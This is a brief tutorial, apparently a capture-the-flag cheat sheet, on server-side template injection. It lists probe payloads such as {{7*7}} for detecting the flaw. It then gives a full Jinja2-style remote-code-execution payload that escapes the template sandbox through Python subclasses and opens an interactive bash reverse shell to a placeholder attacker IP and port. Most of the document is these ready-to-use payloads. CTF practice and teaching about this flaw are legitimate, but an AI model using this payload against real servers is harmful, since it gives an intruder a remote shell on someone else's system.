# Server-Side Template Injection (SSTI)
A simple tutorial of SSTI commonly used in Capture The Flag (CTF). It is a guide to detect SSTI and possibly obtain remote code exection (RCE) on the server.

# Detect if the server is vulnerable to SSTI:
To test for vulnerability, try these each of the payloads below. The expected result should be the multiplication of 7 and 7 which is equal to 49. If one of the payloads return the expected result (i.e. 49), then the server is vulnerable to SSTI.
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
# RCE
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"**ATTACKER_IP**\",**ATTACKER_PORT**));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```
